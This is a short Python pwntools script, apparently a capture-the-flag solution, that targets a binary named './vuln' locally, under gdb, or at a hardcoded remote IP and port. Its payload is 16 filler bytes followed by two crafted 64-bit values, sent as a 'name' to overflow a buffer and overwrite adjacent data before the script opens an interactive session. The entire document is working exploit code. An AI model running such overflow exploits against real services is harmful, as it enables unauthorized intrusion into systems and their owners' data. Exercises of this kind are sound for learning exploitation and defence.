#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("35.200.120.35", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.recvuntil("Press Any Key")
p.sendline(b'\n')
p.recvuntil("!")
p.sendline(b'\n')
p.recvuntil("!")
p.sendline(b'\n')

# buf for name
payload = b"A" * 16
# be a tuyotuyo
payload += p64(0x00ffffffffffffff) * 2
sleep(0.5)
p.sendline(payload)
p.recvuntil(b'OK, Nice name.\n')

p.interactive()
